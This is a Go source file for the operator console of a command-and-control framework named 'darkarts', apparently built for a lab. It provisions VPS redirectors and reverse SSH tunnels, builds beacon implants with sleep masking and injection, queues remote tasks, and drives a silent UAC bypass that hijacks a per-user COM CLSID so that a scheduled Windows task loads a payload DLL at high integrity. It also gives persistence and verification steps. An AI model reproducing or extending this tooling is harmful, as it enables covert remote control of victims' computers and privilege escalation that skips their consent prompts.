package console

import (
	"bufio"
	"bytes"
	"context"
	"encoding/base64"
	"encoding/json"
	"fmt"
	"io"
	"os"
	"os/exec"
	"path/filepath"
	"regexp"
	"strings"
	"time"
	"unicode"
	"unicode/utf8"

	"darkarts/pkg/server"
)

type REPL struct {
	client *Client
	opID   string
	out    io.Writer

	watching  bool
	watchStop context.CancelFunc
	events    chan server.Event
	watchErr  chan error
}

func NewREPL(client *Client, opID string, out io.Writer) *REPL {
	if opID == "" {
		opID = "op-console"
	}
	if out == nil {
		out = io.Discard
	}
	return &REPL{client: client, opID: opID, out: out}
}

func (r *REPL) Run(ctx context.Context, in io.Reader) error {
	lines := make(chan string, 4)
	go func() {
		sc := bufio.NewScanner(in)
		sc.Buffer(make([]byte, 0, 64*1024), 1024*1024)
		for sc.Scan() {
			select {
			case lines <- sc.Text():
			case <-ctx.Done():
				return
			}
		}
		close(lines)
	}()

	for {
		if r.watching {
			select {
			case <-ctx.Done():
				return nil
			case ev := <-r.events:
				r.printEvent(ev)
			case err := <-r.watchErr:
				r.watching = false
				if err != nil {
					fmt.Fprintf(r.out, "watch error: %v\n", err)
				}
				fmt.Fprintln(r.out, "watch ended")
			case line, ok := <-lines:
				if !ok {
					return nil
				}
				if strings.EqualFold(strings.TrimSpace(line), "stop") {
					r.stopWatch()
				} else {
					fmt.Fprintln(r.out, "watching... type \"stop\" to exit")
				}
			}
			continue
		}

		fmt.Fprint(r.out, "dark-arts> ")
		select {
		case <-ctx.Done():
			return nil
		case line, ok := <-lines:
			if !ok {
				fmt.Fprintln(r.out)
				return nil
			}
			line = strings.TrimSpace(line)
			if line == "" {
				continue
			}
			if err := r.exec(ctx, line); err != nil {
				if err == errQuit {
					return nil
				}
				fmt.Fprintf(r.out, "error: %v\n", err)
			}
		}
	}
}

var errQuit = fmt.Errorf("quit")

func (r *REPL) exec(ctx context.Context, line string) error {
	fields := strings.Fields(line)
	cmd := strings.ToLower(fields[0])
	args := fields[1:]
	switch cmd {
	case "help", "?":
		r.help()
	case "quit", "exit":
		return errQuit
	case "stop":
		if r.watching {
			r.stopWatch()
		}
	case "sessions", "ls":
		return r.listSessions(ctx)
	case "sshkey":
		return r.showSSHKey(ctx)
	case "redirector", "vps":
		return r.setupRedirector(ctx, args)
	case "package":
		return r.buildPackage(ctx, args)
	case "session":
		if len(args) >= 1 && args[0] == "del" {
			return r.deleteSessions(ctx, args[1:])
		}
		if len(args) != 1 {
			return fmt.Errorf("usage: session <id> | session del <id...|all>")
		}
		return r.showSession(ctx, args[0])
	case "tunnel":
		if len(args) != 1 {
			return fmt.Errorf("usage: tunnel <user@vps>")
		}
		return r.startTunnel(ctx, args[0])
	case "tunnel-install", "tunnel-install-task":
		if len(args) != 1 {
			return fmt.Errorf("usage: tunnel-install <user@vps>")
		}
		return r.installTunnelTask(ctx, args[0])
	case "touch":
		if len(args) != 2 {
			return fmt.Errorf("usage: touch <id> <agent_pub_hex>")
		}
		if err := r.client.Touch(ctx, args[0], args[1]); err != nil {
			return err
		}
		fmt.Fprintf(r.out, "session %s registered\n", args[0])
	case "ttps":
		return r.listTTPs(ctx)
	case "task":
		return r.issueTask(ctx, args)
	case "tasks":
		return r.listTasks(ctx)
	case "results", "res":
		return r.listResults(ctx, args)
	case "kill":
		if len(args) != 1 {
			return fmt.Errorf("usage: kill <sid>")
		}
		t, err := r.client.IssueTask(ctx, args[0], r.opID, "kill", nil, r.opID)
		if err != nil {
			return err
		}
		fmt.Fprintf(r.out, "kill queued for %s: %s\n", args[0], t.ID)
	case "sleep":
		if len(args) != 2 {
			return fmt.Errorf("usage: sleep <sid> <seconds>")
		}
		t, err := r.client.IssueTask(ctx, args[0], r.opID, "sleep", map[string]string{"seconds": args[1]}, r.opID)
		if err != nil {
			return err
		}
		fmt.Fprintf(r.out, "sleep queued for %s: %s\n", args[0], t.ID)
	case "uactest", "uac-test":
		return r.uacTest(ctx, args)
	case "uacdll", "payload":
		return r.rebuildPayload(ctx, args)
	case "watch":
		if err := r.startWatch(ctx); err != nil {
			return err
		}
		fmt.Fprintln(r.out, "watching... type \"stop\" to exit")
	default:
		return fmt.Errorf("unknown command %q (try help)", cmd)
	}
	return nil
}

func (r *REPL) startWatch(ctx context.Context) error {
	if r.watching {
		return fmt.Errorf("already watching")
	}
	wctx, cancel := context.WithCancel(ctx)
	r.watchStop = cancel
	r.events = make(chan server.Event, 64)
	r.watchErr = make(chan error, 1)
	r.watching = true
	go func() {
		err := r.client.Watch(wctx, func(ev server.Event) error {
			select {
			case r.events <- ev:
			default:
			}
			return nil
		})
		r.watchErr <- err
	}()
	return nil
}

func (r *REPL) stopWatch() {
	if r.watchStop != nil {
		r.watchStop()
		r.watchStop = nil
	}
	r.watching = false
	fmt.Fprintln(r.out, "watch stopped")
}

func (r *REPL) help() {
	fmt.Fprint(r.out, `commands:
  sessions                 list registered sessions
  session <id>             show session detail
  session del <id...|all>  delete session(s) from the operator registry (beacons are NOT auto-discovered;
                        re-register a still-alive beacon with: touch <id> <pub_hex> from its package output)
  sshkey                   show (or generate) the ssh keypair used to reach the VPS
  tunnel <user@vps>        start the reverse tunnel window now and verify it from the VPS
  tunnel-install <user@vps> install a scheduled task so the tunnel auto-starts at logon
  redirector [-Reverse] <user@vps> [domain]   provision a VPS redirector (ssh + nginx TLS
                        :443 -> lab relay :7443), verify, then build+register the package
                        (-Reverse: lab host is NAT'd; VPS forwards into an outbound SSH
                        tunnel to the lab relay - no inbound ports, works on CG-NAT)
  package [-Seed h] [-Edge u]   build beacon.exe + register the session (defaults: fresh identity, auto LAN edge)
  touch <id> <pub_hex>     register a session (id + agent public key)
  ttps                     list available task types
  task <sid> <type> [k=v]  issue a task (params as key=value pairs)
  tasks                    list task queue
  results [sid]            list results
  kill <sid>               kill beacon
  sleep <sid> <seconds>    change beacon sleep interval
  uactest <sid> [cmd]      issue a silent elevation test (method=daily) and watch for the result
  uacdll [-SkipBeacon]     rebuild the uac payload DLL from pkg\beacon\uacdll\darts_ucd.c
                        (then: package -Seed <seed> to bake it into a new beacon.exe)
  watch                    stream live events (type "stop" to exit)
  quit                     exit console
`)
}

func (r *REPL) showSSHKey(ctx context.Context) error {
	pub, _, generated, err := ensureSSHKey(ctx)
	if err != nil {
		return err
	}
	if generated {
		fmt.Fprintln(r.out, "no ssh key found — generated a new ed25519 keypair:")
	} else {
		fmt.Fprintln(r.out, "existing ssh key:")
	}
	fmt.Fprintf(r.out, "private: %s\npublic:  %s\n", defaultKeyPath(), defaultKeyPubPath())
	fmt.Fprintln(r.out, "public key (paste into the OCI launch form / the VPS's authorized_keys):")
	fmt.Fprintln(r.out, pub)
	return nil
}

func defaultKeyPath() string {
	home, _ := os.UserHomeDir()
	return filepath.Join(home, ".ssh", "id_ed25519")
}

func defaultKeyPubPath() string {
	return defaultKeyPath() + ".pub"
}

// ensureSSHKey returns the public key, generating an ed25519 keypair first if
// none exists (id_ed25519 preferred; an existing id_rsa also counts).
func ensureSSHKey(ctx context.Context) (pub string, pubPath string, generated bool, err error) {
	ed25519 := defaultKeyPath()
	for _, priv := range []string{ed25519, strings.TrimSuffix(ed25519, "id_ed25519") + "id_rsa"} {
		if _, statErr := os.Stat(priv); statErr == nil {
			b, readErr := os.ReadFile(priv + ".pub")
			if readErr != nil {
				return "", "", false, fmt.Errorf("key %s exists but %s.pub is unreadable: %w", priv, priv, readErr)
			}
			return strings.TrimSpace(string(b)), priv + ".pub", false, nil
		}
	}
	if err := os.MkdirAll(filepath.Dir(ed25519), 0o700); err != nil {
		return "", "", false, err
	}
	cmd := exec.CommandContext(ctx, "ssh-keygen", "-q", "-t", "ed25519", "-N", "", "-C", "darkarts-lab", "-f", ed25519)
	if out, err := cmd.CombinedOutput(); err != nil {
		return "", "", false, fmt.Errorf("ssh-keygen failed: %v (%s)", err, strings.TrimSpace(string(out)))
	}
	b, err := os.ReadFile(defaultKeyPubPath())
	if err != nil {
		return "", "", false, err
	}
	return strings.TrimSpace(string(b)), defaultKeyPubPath(), true, nil
}

func (r *REPL) startTunnel(ctx context.Context, target string) error {
	fmt.Fprintf(r.out, "== starting the reverse tunnel to %s ==\n", target)
	if err := startTunnelWindow(ctx, target); err != nil {
		return fmt.Errorf("tunnel start failed: %v (run lab\\redirector\\tunnel.cmd %s manually)", err, target)
	}
	fmt.Fprintln(r.out, "tunnel started in its own window (it stays open; close it to stop)")
	fmt.Fprintln(r.out, "  persistent at logon: tunnel-install "+target)
	fmt.Fprintln(r.out, "== verifying the forward from the VPS ==")
	time.Sleep(6 * time.Second)
	code, err := sshOut(ctx, target, "curl", "-sk", "-o", "/dev/null", "-w", "%{http_code}", "https://127.0.0.1/healthz")
	if err != nil {
		fmt.Fprintf(r.out, "verification failed: %v\n", err)
		return nil
	}
	if code == "200" {
		fmt.Fprintln(r.out, "tunnel OK: https://<vps>:443 -> relay reachable")
	} else {
		fmt.Fprintf(r.out, "tunnel up but healthz returned %s — check the tunnel window or the relay\n", code)
	}
	return nil
}

func (r *REPL) installTunnelTask(ctx context.Context, target string) error {
	script := "lab/redirector/install-tunnel-task.ps1"
	abs, err := filepath.Abs(script)
	if err != nil || !func() bool { _, err := os.Stat(abs); return err == nil }() {
		return fmt.Errorf("%s not found: %w", script, err)
	}
	fmt.Fprintf(r.out, "== installing logon task for tunnel to %s ==\n", target)
	cmd := exec.CommandContext(ctx, "powershell", "-NoProfile", "-ExecutionPolicy", "Bypass", "-File", abs, target)
	cmd.Stdout = r.out
	cmd.Stderr = r.out
	if err := cmd.Run(); err != nil {
		return fmt.Errorf("tunnel-install failed: %w", err)
	}
	return nil
}

func startTunnelWindow(ctx context.Context, target string) error {
	abs, err := filepath.Abs("lab/redirector/tunnel.cmd")
	if err != nil || !func() bool { _, err := os.Stat(abs); return err == nil }() {
		return fmt.Errorf("tunnel.cmd not found: %w", err)
	}
	return exec.CommandContext(ctx, "powershell", "-NoProfile", "-WindowStyle", "Hidden", "-Command",
		fmt.Sprintf(`Start-Process cmd -ArgumentList '/k','"%s"','%s'`, abs, target)).Run()
}

func (r *REPL) setupRedirector(ctx context.Context, args []string) error {
	reverse := false
	if len(args) > 0 && (args[0] == "-Reverse" || args[0] == "-reverse" || args[0] == "-r") {
		reverse = true
		args = args[1:]
	}
	if len(args) < 1 {
		return fmt.Errorf("usage: redirector [-Reverse] <user@vps-ip> [domain]")
	}
	target := args[0]
	domain := ""
	labIP := ""
	if len(args) > 1 {
		domain = args[1]
	}
	if len(args) > 2 {
		labIP = args[2]
	}
	if reverse {
		labIP = "127.0.0.1"
	} else if labIP == "" {
		ip, err := detectLabIP()
		if err != nil {
			return fmt.Errorf("lab-ip autodetect failed (%v) — pass it explicitly", err)
		}
		labIP = ip
	}

	script, err := os.ReadFile("lab/redirector/setup.sh")
	if err != nil {
		return fmt.Errorf("run the console from the repo root (lab/redirector/setup.sh not found): %w", err)
	}

	pub, _, generated, err := ensureSSHKey(ctx)
	if err != nil {
		return fmt.Errorf("ssh key check failed: %w", err)
	}
	if generated {
		fmt.Fprintln(r.out, "== generated a new ssh keypair (ed25519) ==")
		fmt.Fprintln(r.out, "public key — add it to the VPS before re-running:")
		fmt.Fprintln(r.out, "  "+pub)
		fmt.Fprintln(r.out, "  (OCI: paste into the instance launch form; existing VPS: append to ~/.ssh/authorized_keys)")
		return fmt.Errorf("ssh key did not exist — added it above; install it on the VPS, then run the command again")
	}

	if !reverse {
		if err := ensureFirewallRule(r.out); err != nil {
			fmt.Fprintf(r.out, "firewall: %v\n", err)
			fmt.Fprintln(r.out, "  run the console elevated or add the rule manually:")
			fmt.Fprintln(r.out, "  New-NetFirewallRule -DisplayName \"darkarts-relay\" -Direction Inbound -Protocol TCP -LocalPort 7443 -Action Allow")
		}
		fmt.Fprintf(r.out, "== provisioning %s (nginx TLS :443 -> %s:7443) ==\n", target, labIP)
	} else {
		fmt.Fprintf(r.out, "== provisioning %s (nginx TLS :443 -> reverse tunnel to lab relay :7443) ==\n", target)
	}
	sshArgs := []string{"-o", "StrictHostKeyChecking=accept-new", "-o", "ConnectTimeout=15", target,
		"bash", "-s", "--", labIP}
	if domain != "" {
		sshArgs = append(sshArgs, domain)
	}
	cmd := exec.CommandContext(ctx, "ssh", sshArgs...)
	cmd.Stdin = bytes.NewReader(script)
	cmd.Stdout = r.out
	cmd.Stderr = r.out
	if err := cmd.Run(); err != nil {
		return fmt.Errorf("vps setup failed: %w", err)
	}

	if reverse {
		fmt.Fprintln(r.out, "== starting the reverse tunnel from the lab host ==")
		if err := startTunnelWindow(ctx, target); err != nil {
			fmt.Fprintf(r.out, "tunnel start failed: %v (run lab\\redirector\\tunnel.cmd %s manually)\n", err, target)
		} else {
			fmt.Fprintln(r.out, "tunnel started in its own window")
		}
		fmt.Fprintln(r.out, "  for a persistent tunnel (auto-start at logon): tunnel-install "+target)
	}

	fmt.Fprintln(r.out, "== verifying the forward from the VPS ==")
	time.Sleep(6 * time.Second)
	code, err := sshOut(ctx, target, "curl", "-sk", "-o", "/dev/null", "-w", "%{http_code}", "https://127.0.0.1/healthz")
	if err != nil {
		fmt.Fprintf(r.out, "verification failed: %v\n", err)
	} else if code == "200" {
		fmt.Fprintln(r.out, "redirector OK: https://<vps>:443 -> relay reachable")
	} else {
		fmt.Fprintf(r.out, "redirector up but healthz returned %s — check the tunnel (reverse mode) or the lab host firewall/relay\n", code)
	}

	edgeHost := domain
	if edgeHost == "" {
		edgeHost = target
		if i := strings.LastIndexByte(edgeHost, '@'); i >= 0 {
			edgeHost = edgeHost[i+1:]
		}
	}
	if code == "200" {
		fmt.Fprintf(r.out, "redirector OK: https://%s:443 -> relay reachable\n", edgeHost)
	}
	edgeIP := labIP
	if reverse {
		if ip, err := detectLabIP(); err == nil {
			edgeIP = ip
		}
	}
	edge := fmt.Sprintf("https://%s:443,http://%s:7443", edgeHost, edgeIP)
	fmt.Fprintf(r.out, "== building beacon with edges: %s ==\n", edge)
	return r.buildPackage(ctx, []string{"-Edge", edge, "-Insecure"})
}

func detectLabIP() (string, error) {
	ps := `(Get-NetRoute -DestinationPrefix '0.0.0.0/0' -ErrorAction SilentlyContinue |
Sort-Object RouteMetric | Select-Object -First 1 | ForEach-Object {
(Get-NetIPAddress -InterfaceIndex $_.InterfaceIndex -AddressFamily IPv4 -ErrorAction SilentlyContinue |
Where-Object { $_.IPAddress -notlike '127.*' -and $_.IPAddress -notlike '169.254.*' } |
Select-Object -First 1).IPAddress })`
	out, err := exec.Command("powershell", "-NoProfile", "-Command", ps).Output()
	if err != nil {
		return "", err
	}
	ip := strings.TrimSpace(string(out))
	if ip == "" {
		return "", fmt.Errorf("no default-route IPv4 found")
	}
	return ip, nil
}

func ensureFirewallRule(out io.Writer) error {
	ps := `New-NetFirewallRule -DisplayName 'darkarts-relay' -Direction Inbound -Protocol TCP -LocalPort 7443 -Action Allow -ErrorAction Stop | Out-Null`
	if err := exec.Command("powershell", "-NoProfile", "-Command", ps).Run(); err != nil {
		return err
	}
	fmt.Fprintln(out, "firewall: inbound TCP 7443 rule ensured")
	return nil
}

func sshOut(ctx context.Context, target string, args ...string) (string, error) {
	sshArgs := append([]string{"-o", "StrictHostKeyChecking=accept-new", "-o", "ConnectTimeout=10", target}, args...)
	out, err := exec.CommandContext(ctx, "ssh", sshArgs...).Output()
	if err != nil {
		return "", err
	}
	return strings.TrimSpace(string(out)), nil
}

func (r *REPL) buildPackage(ctx context.Context, args []string) error {
	script := "lab/make-laptop-package.ps1"
	repoRoot := "."
	if _, err := os.Stat(script); err != nil {
		return fmt.Errorf("run the console from the repo root (%s not found): %w", script, err)
	}
	cmdArgs := []string{"-NoProfile", "-ExecutionPolicy", "Bypass", "-File", script, "-SleepMask"}
	for i := 0; i < len(args); i++ {
		switch args[i] {
		case "-Seed", "-seed":
			i++
			if i >= len(args) {
				return fmt.Errorf("usage: package [-Seed <64-hex>] [-Edge <urls>] [-Insecure] [-NoInject]")
			}
			cmdArgs = append(cmdArgs, "-Seed", args[i])
		case "-Edge", "-edge":
			i++
			if i >= len(args) {
				return fmt.Errorf("usage: package [-Seed <64-hex>] [-Edge <urls>] [-Insecure] [-NoInject]")
			}
			cmdArgs = append(cmdArgs, "-Edge", args[i])
		case "-NoInject":
			cmdArgs = append(cmdArgs, "-NoInject")
		case "-Insecure", "-insecure":
			cmdArgs = append(cmdArgs, "-Insecure")
		default:
			return fmt.Errorf("unknown package flag %q (usage: package [-Seed <64-hex>] [-Edge <urls>] [-Insecure] [-NoInject])", args[i])
		}
	}
	cmd := exec.CommandContext(ctx, "powershell", cmdArgs...)
	cmd.Dir = repoRoot
	var out bytes.Buffer
	cmd.Stdout = io.MultiWriter(r.out, &out)
	cmd.Stderr = r.out
	fmt.Fprintln(r.out, "building package (this can take a minute)...")
	if err := cmd.Run(); err != nil {
		return fmt.Errorf("package build failed: %w", err)
	}
	if sid := packageSID(out.String()); sid != "" {
		r.deployHint(sid)
	}
	return nil
}

var sidRe = regexp.MustCompile(`id=([0-9a-fA-F]{8,})`)

// packageSID extracts the session id from the package script output (both the
// "registered: sid=..." and the "POST /api/v1/sessions id=..." lines match).
func packageSID(out string) string {
	m := sidRe.FindAllStringSubmatch(out, -1)
	if len(m) == 0 {
		return ""
	}
	return m[len(m)-1][1]
}

// rebuildPayload compiles the uac payload DLL from C source and regenerates
// the embedded byte array (pkg/beacon/uac_daily_dll.go). Only needed when
// pkg/beacon/uacdll/darts_ucd.c changes; then bake it with: package -Seed <seed>.
func (r *REPL) rebuildPayload(ctx context.Context, args []string) error {
	script := "lab/rebuild-uac-dll.ps1"
	if _, err := os.Stat(script); err != nil {
		return fmt.Errorf("run the console from the repo root (%s not found): %w", script, err)
	}
	cmdArgs := []string{"-NoProfile", "-ExecutionPolicy", "Bypass", "-File", script}
	for i := 0; i < len(args); i++ {
		switch args[i] {
		case "-SkipBeacon":
			cmdArgs = append(cmdArgs, "-SkipBeacon")
		case "-Gcc", "-gcc":
			i++
			if i >= len(args) {
				return fmt.Errorf("usage: uacdll [-SkipBeacon] [-Gcc <path>]")
			}
			cmdArgs = append(cmdArgs, "-Gcc", args[i])
		default:
			return fmt.Errorf("unknown flag %q (usage: uacdll [-SkipBeacon] [-Gcc <path>])", args[i])
		}
	}
	cmd := exec.CommandContext(ctx, "powershell", cmdArgs...)
	cmd.Stdout = r.out
	cmd.Stderr = r.out
	fmt.Fprintln(r.out, "rebuilding the uac payload DLL (gcc + gen.ps1)...")
	if err := cmd.Run(); err != nil {
		return fmt.Errorf("payload rebuild failed: %w", err)
	}
	return nil
}

func (r *REPL) deployHint(sid string) {
	fmt.Fprintln(r.out, "== deploy + test the silent uac channel ==")
	fmt.Fprintln(r.out, "  1. copy lab\\laptop-pkg\\beacon.exe to the laptop and double-click it")
	fmt.Fprintln(r.out, "  2. wait ~15s, then confirm check-in:  sessions")
	fmt.Fprintf(r.out, "  3. test silent elevation:            uactest %s\n", sid)
	fmt.Fprintln(r.out, "     (first result waits for the 12:00 daily sync fire; later ones return in seconds)")
}

// uacTest issues a silent uac task (method=daily) on a session and watches for
// the result. If the channel is already bootstrapped the result arrives in
// seconds; otherwise the console explains the daily fire wait and prints the
// on-laptop verification checklist.
func (r *REPL) uacTest(ctx context.Context, args []string) error {
	if len(args) < 1 {
		return fmt.Errorf("usage: uactest <sid> [cmd]")
	}
	sid := args[0]
	cmd := "whoami /groups"
	if len(args) > 1 {
		cmd = strings.TrimPrefix(strings.Join(args[1:], " "), "cmd=")
	}
	fmt.Fprintf(r.out, "== issuing uac test (silent daily channel) on %s ==\n", sid)
	fmt.Fprintf(r.out, "   command: %s\n", cmd)
	t, err := r.client.IssueTask(ctx, sid, r.opID, "uac", map[string]string{"cmd": cmd}, r.opID)
	if err != nil {
		return err
	}
	fmt.Fprintf(r.out, "queued %s\n", t.ID)
	fmt.Fprintln(r.out, "   first invocation waits for the UnifiedConsentSyncTask daily fire (12:00±2h, up to ~26h);")
	fmt.Fprintln(r.out, "   if the channel is already bootstrapped the result returns in seconds.")
	fmt.Fprintln(r.out, "watching for the result...")
	deadline := time.Now().Add(60 * time.Second)
	for time.Now().Before(deadline) {
		results, err := r.client.Results(ctx)
		if err != nil {
			return err
		}
		for _, res := range results {
			if res.TaskID != t.ID {
				continue
			}
			if res.Error != "" {
				fmt.Fprintf(r.out, "result: error=%q\n", res.Error)
			} else {
				fmt.Fprintln(r.out, "== elevated output ==")
				fmt.Fprintln(r.out, prettyOutput(res.Output))
			}
			r.uacChecklist()
			return nil
		}
		select {
		case <-ctx.Done():
			return ctx.Err()
		case <-time.After(2 * time.Second):
		}
	}
	fmt.Fprintln(r.out, "no result within 60s — the channel is waiting for the next daily fire.")
	r.uacChecklist()
	r.uacTroubleshooting()
	return nil
}

func (r *REPL) uacChecklist() {
	fmt.Fprintln(r.out, "== verify the channel on the laptop ==")
	fmt.Fprintf(r.out, "  type %%TEMP%%\\uc_daily_marker.txt       # \"il=1\" = loaded at HIGH, last line \"done\"\n")
	fmt.Fprintf(r.out, "  schtasks /query /tn \\DarkArts-uac     # the bootstrapped HIGHEST task\n")
	fmt.Fprintf(r.out, "  reg query \"HKCU\\Software\\Classes\\CLSID\\{82AA0895-198A-4C1B-B2D1-C16894218AFB}\\InprocServer32\"\n")
	fmt.Fprintf(r.out, "                                        # -> %%TEMP%%\\darts_ucd.dll\n")
	fmt.Fprintln(r.out, "  afterwards the channel is instant: task <sid> uac cmd=...  (or uactest <sid>)")
}

func (r *REPL) uacTroubleshooting() {
	fmt.Fprintln(r.out, "== if there is still no result after the daily fire ==")
	fmt.Fprintln(r.out, "  - the laptop user must be logged on (runs in the interactive session)")
	fmt.Fprintf(r.out, "  - schtasks /query /tn \\Microsoft\\Windows\\ConsentUX\\UnifiedConsent\\UnifiedConsentSyncTask  (Last Run Time)\n")
	fmt.Fprintf(r.out, "  - %%TEMP%%\\uc_daily_marker.txt missing -> DLL never loaded (CLSID override deleted?)\n")
	fmt.Fprintln(r.out, "  - marker shows il=0                  -> activated at low integrity")
	fmt.Fprintln(r.out, "  - immediate fallback (one prompt):   task <sid> uac method=schtasks cmd=whoami /groups")
	fmt.Fprintln(r.out, "  - Win10 (no UnifiedConsentSyncTask): use method=schtasks")
}

func (r *REPL) listSessions(ctx context.Context) error {
	sessions, err := r.client.Sessions(ctx)
	if err != nil {
		return err
	}
	if len(sessions) == 0 {
		fmt.Fprintln(r.out, "no sessions")
		return nil
	}
	for _, s := range sessions {
		fmt.Fprintf(r.out, "%-36s first=%s last=%s beacons=%d\n",
			s.ID, s.FirstSeen.Format("15:04:05"), s.LastSeen.Format("15:04:05"), s.Beacons)
	}
	return nil
}

func (r *REPL) showSession(ctx context.Context, id string) error {
	s, err := r.client.Session(ctx, id)
	if err != nil {
		return err
	}
	fmt.Fprintf(r.out, "id:        %s\n", s.ID)
	fmt.Fprintf(r.out, "agent_pub: %s\n", s.AgentPub)
	fmt.Fprintf(r.out, "first_seen:%s\n", s.FirstSeen.Format(time.RFC3339))
	fmt.Fprintf(r.out, "last_seen: %s\n", s.LastSeen.Format(time.RFC3339))
	fmt.Fprintf(r.out, "beacons:   %d\n", s.Beacons)
	return nil
}

func (r *REPL) deleteSessions(ctx context.Context, args []string) error {
	if len(args) == 0 {
		return fmt.Errorf("usage: session del <id...|all>")
	}
	if args[0] == "all" {
		all, err := r.client.Sessions(ctx)
		if err != nil {
			return err
		}
		if len(all) == 0 {
			fmt.Fprintln(r.out, "no sessions")
			return nil
		}
		for _, s := range all {
			if err := r.client.DeleteSession(ctx, s.ID); err != nil {
				fmt.Fprintf(r.out, "delete %s: %v\n", s.ID, err)
			} else {
				fmt.Fprintf(r.out, "deleted %s\n", s.ID)
			}
		}
		return nil
	}
	for _, id := range args {
		if err := r.client.DeleteSession(ctx, id); err != nil {
			fmt.Fprintf(r.out, "delete %s: %v\n", id, err)
		} else {
			fmt.Fprintf(r.out, "deleted %s\n", id)
		}
	}
	return nil
}

func (r *REPL) listTTPs(ctx context.Context) error {
	specs, err := r.client.TTPs(ctx)
	if err != nil {
		return err
	}
	for _, s := range specs {
		fmt.Fprintf(r.out, "%-10s %s\n", s.Name, s.Description)
		for _, a := range s.Args {
			req := ""
			if a.Required {
				req = " (required)"
			}
			fmt.Fprintf(r.out, "    %s%s: %s\n", a.Name, req, a.Description)
		}
	}
	return nil
}

func (r *REPL) issueTask(ctx context.Context, args []string) error {
	if len(args) < 2 {
		return fmt.Errorf("usage: task <sid> <type> [k=v ...]")
	}
	params := map[string]string{}
	lastKey := ""
	for _, tok := range args[2:] {
		i := strings.IndexByte(tok, '=')
		if i > 0 {
			lastKey = tok[:i]
			params[lastKey] = tok[i+1:]
			continue
		}
		if lastKey == "" {
			return fmt.Errorf("param %q must be key=value (or continue the previous value)", tok)
		}
		params[lastKey] += " " + tok
	}
	t, err := r.client.IssueTask(ctx, args[0], r.opID, args[1], params, r.opID)
	if err != nil {
		return err
	}
	fmt.Fprintf(r.out, "queued %s type=%s status=%s\n", t.ID, t.Type, t.Status)
	return nil
}

func (r *REPL) listTasks(ctx context.Context) error {
	tasks, err := r.client.Tasks(ctx)
	if err != nil {
		return err
	}
	if len(tasks) == 0 {
		fmt.Fprintln(r.out, "no tasks")
		return nil
	}
	for _, t := range tasks {
		fmt.Fprintf(r.out, "%-22s %-8s %-36s %s\n", t.ID, t.Type, t.SessionID, t.Status)
	}
	return nil
}

func (r *REPL) listResults(ctx context.Context, args []string) error {
	results, err := r.client.Results(ctx)
	if err != nil {
		return err
	}
	filter := ""
	if len(args) == 1 {
		filter = args[0]
	}
	n := 0
	for _, res := range results {
		if filter != "" && res.SessionID != filter {
			continue
		}
		n++
		if res.Error != "" {
			fmt.Fprintf(r.out, "%s %s error=%q\n", res.TaskID, res.SessionID, res.Error)
			continue
		}
		fmt.Fprintf(r.out, "%s %s %s\n", res.TaskID, res.SessionID, prettyOutput(res.Output))
	}
	if n == 0 {
		fmt.Fprintln(r.out, "no results")
	}
	return nil
}

func (r *REPL) printEvent(ev server.Event) {
	fmt.Fprintf(r.out, "[%s] %s %s\n", ev.Time.Format("15:04:05"), ev.Kind, compactJSON(ev.Data))
}

func compactJSON(raw []byte) string {
	if len(raw) == 0 {
		return ""
	}
	var v any
	if err := json.Unmarshal(raw, &v); err != nil {
		return string(raw)
	}
	out, err := json.Marshal(v)
	if err != nil {
		return string(raw)
	}
	return string(out)
}

func prettyOutput(b []byte) string {
	if len(b) == 0 {
		return "(empty)"
	}
	if utf8.Valid(b) && printable(string(b)) {
		return string(b)
	}
	return "(base64) " + base64.StdEncoding.EncodeToString(b)
}

func printable(s string) bool {
	for _, r := range s {
		if r == '\n' || r == '\r' || r == '\t' {
			continue
		}
		if !unicode.IsPrint(r) {
			return false
		}
	}
	return true
}
